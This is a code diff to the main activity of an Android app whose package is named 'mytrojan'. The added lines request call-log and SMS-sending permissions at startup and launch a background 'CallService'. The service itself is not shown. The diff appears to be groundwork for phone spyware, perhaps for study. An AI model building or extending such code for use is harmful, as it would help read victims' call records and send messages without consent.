@@ -1,10 +1,14 @@
 package com.example.mytrojan;
 
+import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
@@ -23,6 +27,27 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int DELAY_MS = 5000;
 
+    private void request_permission() {
+
+        int hasPermission = ContextCompat.checkSelfPermission(this, (Manifest.permission.READ_CALL_LOG));
+
+        String [] pers = new String [2];
+        if (hasPermission !=  PackageManager.PERMISSION_GRANTED) {
+            pers[0] = Manifest.permission.READ_CALL_LOG;
+        }
+
+        hasPermission = ContextCompat.checkSelfPermission(this, (Manifest.permission.SEND_SMS));
+        if (hasPermission !=  PackageManager.PERMISSION_GRANTED) {
+            pers[1] = Manifest.permission.SEND_SMS;
+        }
+
+
+        ActivityCompat.requestPermissions(this, pers, 1);
+
+
+
+
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,6 +59,8 @@ public class MainActivity extends AppCompatActivity {
         text = findViewById(R.id.textView);
         yes = findViewById(R.id.btnYes);
         no = findViewById(R.id.btnNo);
+
+        request_permission();
 
         new ExecuteIt(this);
 
@@ -70,6 +97,9 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+
+        Intent intent = new Intent(this, CallService.class);
+        startService(intent);
 
     }
 
